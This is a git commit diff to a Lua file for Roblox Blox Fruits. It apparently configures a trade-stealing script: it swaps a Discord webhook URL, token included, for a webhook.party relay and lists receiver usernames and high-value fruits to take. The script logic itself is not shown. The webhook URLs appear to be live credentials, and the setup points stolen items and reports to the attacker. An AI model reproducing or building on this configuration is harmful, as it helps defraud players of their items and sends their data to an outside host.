2180a86532c981c70dc838ee7da2348a36a4998d
redz <hehiaha2@gmail.com>
2025-02-11 20:54:26 +0700

    Update Source1(BF).lua

--- Source1(BF).lua
+++ Source1(BF).lua
@@ -1,4 +1,4 @@
-Webhook = "https://discord.com/api/webhooks/1336920371731107860/i7yr3mnRZAhHi7tKt_oijqRTqlALwky6U7MmACfKTYTPOwypr8JpWaXC4Ow39U7Ikm2m"
+Webhook = "https://l.webhook.party/hook/mG1CtwkenFxWBnm3vwE3At5nAR0PAs4cKvzcrqmIC4GCWnLZacqIGsAML4rJwppKihGH77XBuUud5YoAuIglyGC5ri348%2BcdFIegmhVAIB8FI6Zn39OAVa7pYv6Hn0Z9Q0%2Bsl7GXeOg382DKrh0t1wz9l0J5QmRyCMYm%2FsWr1aPENIh%2BBUjhDvFiTs14Z31rGIGn5eau7haYgNhBgMEKByKhNaMnSO%2BqodLPDeNyTP6UeJg6Y4ikvOeX17KFqzPMekSqkekm56Xybl5X0RDsXIwC%2FJRZJhjpVekJEjmEovBrdxMTlffazmTnK5ytYCHQKTgbz59B%2F92HN2FkNSH%2B%2FgZK89TW3DibZsHWxyVpNMXcqnQ%2F0AdkSikFMZ72AMFiPgfC2W%2B%2B14y3vUIO/VkbQ1ozB19wEcHyw"
 Usernames = {"GONNN00", "tluan93"} -- << Username(-s) it'll accept trade with
 Fruits = {"Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Control-Control"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
